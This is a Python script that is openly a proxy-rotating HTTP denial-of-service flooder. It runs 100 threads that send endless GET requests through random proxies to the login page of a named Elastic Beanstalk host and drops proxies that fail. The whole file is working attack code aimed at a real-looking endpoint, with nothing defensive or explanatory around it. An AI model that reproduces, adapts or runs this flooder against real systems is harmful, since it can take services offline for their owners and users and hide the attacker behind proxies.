import threading
import requests
import time
import random

# -------- CONFIGURATION --------
TARGET_URL = "http://flask-env.eba-7mjjpfcw.eu-west-2.elasticbeanstalk.com/login"
NUM_THREADS = 100            # 并发线程数
PROXY_FILE = "attacks/DDos/proxy_valid.txt"  # 你的代理列表文件

HEADERS = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

# -------- LOAD PROXY LIST --------
def load_proxies(path: str):
    with open(path, "r", encoding="utf-8") as f:
        lines = [line.strip() for line in f if line.strip()]
    # 统一加协议前缀（如果没有）
    proxies = []
    for p in lines:
        if p.startswith("http"):
            proxies.append(p)
        else:
            proxies.append("http://" + p)
    print(f"✅ Loaded {len(proxies)} proxies.")
    return proxies

PROXY_LIST = load_proxies(PROXY_FILE)

# -------- FUNCTION FOR EACH THREAD --------
def flood():
    while True:
        if not PROXY_LIST:
            print(f"[{threading.current_thread().name}] ❌ No proxies left, exiting.")
            break

        proxy = random.choice(PROXY_LIST)
        proxies = {      # requests 接收的格式
            "http": proxy,
            "https": proxy
        }
        try:
            resp = requests.get(TARGET_URL,
                                headers=HEADERS,
                                proxies=proxies,
                                timeout=5)
            print(f"[{threading.current_thread().name}] {proxy} -> {resp.status_code}")
        except Exception as e:
            # 代理失败，移除以节省资源
            print(f"[{threading.current_thread().name}] ⚠️ {proxy} dead ({e})")
            try:
                PROXY_LIST.remove(proxy)
            except ValueError:
                pass  # 已被其他线程删掉
        time.sleep(0.01)

# -------- START THREADS --------
if __name__ == '__main__':
    print(f"\n🚀  Launching HTTP‑proxy DDoS on  {TARGET_URL}")
    print(f"🚀  Thread count : {NUM_THREADS}\n")
    for i in range(NUM_THREADS):
        t = threading.Thread(target=flood, name=f"T{i+1:02d}", daemon=True)
        t.start()

    try:
        while threading.active_count() > 1:
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n🛑  Stopped manually.")
